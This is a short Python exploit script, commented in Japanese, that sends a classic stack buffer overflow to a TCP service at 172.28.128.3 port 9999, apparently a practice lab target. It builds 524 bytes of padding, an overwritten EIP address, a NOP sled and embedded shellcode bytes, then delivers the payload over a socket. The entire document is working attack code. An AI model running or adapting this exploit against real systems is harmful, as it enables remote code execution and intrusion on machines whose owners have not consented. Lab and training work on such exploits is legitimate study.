#!/usr/bin/env python3

import socket
from time import sleep

# バッファ構築
junk = b"A" * 524
eip  = b"\xF3\x12\x17\x31"  # little endian address
nops = b"\x90" * 32
shellcode = b""
shellcode += b"\xba\xc6\xbf\xdc\x68\xdb\xdd\xd9\x74\x24\xf4\x5e\x31\xc9"
shellcode += b"\xb1\x12\x31\x56\x12\x83\xc6\x04\x03\x90\xb1\x3e\x9d\x2d"
shellcode += b"\x15\x49\xbd\x1e\xea\xe5\x28\xa2\x65\xe8\x1d\xc4\xb8\x6b"
shellcode += b"\xce\x51\xf3\x53\x3c\xe1\xba\xd2\x47\x89\x90\x39\x38\x7b"
shellcode += b"\x81\x43\x38\x6a\x0d\xcd\xd9\x3c\xcb\x9d\x48\x6f\xa7\x1d"
shellcode += b"\xe2\x6e\x0a\xa1\xa6\x18\xfb\x8d\x35\xb0\x6b\xfd\x96\x22"
shellcode += b"\x05\x88\x0a\xf0\x86\x03\x2d\x44\x23\xd9\x2e"

payload = junk + eip + nops + shellcode

# ソケット通信
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('172.28.128.3', 9999))

try:
    data = s.recv(1024)
    print(data.decode(errors="ignore") + '\n')
except socket.error as err:
    print(err)

s.sendall(payload)

try:
    data = s.recv(1024)
    print(data.decode(errors="ignore") + '\n')
except socket.error as err:
    print(err)

s.close()
